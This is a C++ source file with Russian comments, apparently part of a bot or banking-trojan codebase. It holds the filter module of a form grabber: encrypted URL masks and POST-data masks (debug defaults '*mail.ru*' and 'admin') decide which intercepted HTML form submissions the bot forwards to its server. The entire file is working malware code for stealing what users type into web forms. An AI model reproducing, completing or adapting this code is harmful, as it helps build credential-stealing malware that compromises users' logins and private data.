//---------------------------------------------------------------------------


#pragma hdrstop

#include "Modules.h"
#ifdef FgrFiltersH


//---------------------------------------------------------------------------
#include "Memory.h"
#include "Strings.h"
#include "Crypt.h"

//---------------------------------------------------------------------------



#include "BotDebug.h"

namespace FGRFLTDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define FGRFLTDBG FGRFLTDEBUGSTRINGS::DBGOutMessage<>


//****************************************************
//  Массив URL адресов с которых бот будет отправлять
//  данные HTML форм.
//****************************************************
#ifndef DEBUGCONFIG
	char FGR_URL_FILTERS[FGRFILTER_PARAM_SIZE_URLS] = FGRFILTER_PARAM_NAME_URLS;
#else
	char FGR_URL_FILTERS[FGRFILTER_PARAM_SIZE_URLS] = "*mail.ru*\0";
#endif
#define FGR_URL_FILTERS_HASH 0xBB05876C /* FGR_URL_FILTERS */


//****************************************************
//  Массив масок перехватываемых пост данных
//****************************************************
#ifndef DEBUGCONFIG
	char FGR_PARAMS_FILTERS[FGRFILTER_PARAM_SIZE_DATAMASK] = FGRFILTER_PARAM_NAME_DATAMASK;
#else
	char FGR_PARAMS_FILTERS[FGRFILTER_PARAM_SIZE_DATAMASK] = "admin\0";
#endif

#define FGR_PARAMS_FILTERS_HASH 0xBE738607 /* FGR_PARAMS_FILTERS */


//---------------------------------------------------------------------


//-------------------------------------------------
//  FiltrateFormGrabberURL - Функция возвращает
//  	истину если ссылка поддерживается
//		формграбером
//-------------------------------------------------
bool FiltrateFormGrabberURL(const char* URL)
{
	//  Ыункция возвращает истину если ссылка
	//	поддерживается	формграбером

	if (AnsiStr::IsEmpty(URL))
		return false;

	TStrEnum E(FGR_URL_FILTERS, FGRFILTER_PARAM_ENCRYPTED_URLS, FGR_URL_FILTERS_HASH);

	if (E.IsEmpty())
		return true;

	while (E.Next())
	{
		if (WildCmp((char*)URL, E.Line().t_str()))
			return true;
	}

    return false;
}
//---------------------------------------------------------------------


//-------------------------------------------------
//  FiltrateFormGrabberData - функция возвращает
//  	истину если данные прошли фильтрацию
//-------------------------------------------------
bool FiltrateFormGrabberData(const char* Data)
{
	if (AnsiStr::IsEmpty(Data))
		return false;

	TStrEnum E(FGR_PARAMS_FILTERS, FGRFILTER_PARAM_ENCRYPTED_DATAMASK, FGR_PARAMS_FILTERS_HASH);

	if (E.IsEmpty())
		return true;

	while (E.Next())
	{
		if (WildCmp((char*)Data, E.Line().t_str()))
			return true;
	}
		
    return false;
}



//-------------------------------------------------
//  Функция фильтрует пост данные и в случае
//  необходимости отправки их на сервер возвращает
//  истину
//-------------------------------------------------
bool FiltratePostData(const char* URL, const char* Data)
{
	bool Result = FiltrateFormGrabberURL(URL) ||
				  FiltrateFormGrabberData(Data);
	if (Result)
	{
		FGRFLTDBG("FormGrabber_Filters", "Отреагировали на пост данные. URL %s", URL);
	}
	return Result;
}



//---------------------------------------------------------------------------
#endif
